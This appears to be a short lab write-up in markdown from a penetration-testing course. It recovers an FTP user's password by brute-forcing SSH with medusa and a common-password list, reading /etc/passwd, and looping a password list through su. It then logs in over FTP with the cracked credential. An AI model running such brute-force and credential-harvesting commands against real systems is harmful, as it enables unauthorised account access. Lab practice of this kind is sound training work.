# [Web Services](Web%20Services.md)
### What was the password for the ftpuser?

```shell
medusa -h 154.57.164.67 -n 31134 -u sshuser -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t4
```
![](Screenshot%202026-06-14%20at%2014.29.33.png)

```shell
ssh sshuser@154.57.164.67 -p 31134

cat /etc/passwd | grep ftp
```
![](Screenshot%202026-06-14%20at%2014.31.26.png)

let's using this script for `internal bruteforcing`

```shell
for password in $(cat 2020-200_most_used_passwords.txt); do  
echo "Testing: $password"  
echo "$password" | su ftpuser -c "whoami" 2>/dev/null && echo "SUCCESS: $password" && break  
done
```
![](Screenshot%202026-06-14%20at%2014.35.16.png)

```shell
ftp ftp://ftpuser:qqww1122@localhost
```

![](Screenshot%202026-06-14%20at%2014.36.14.png)
![](Screenshot%202026-06-14%20at%2014.36.38.png)
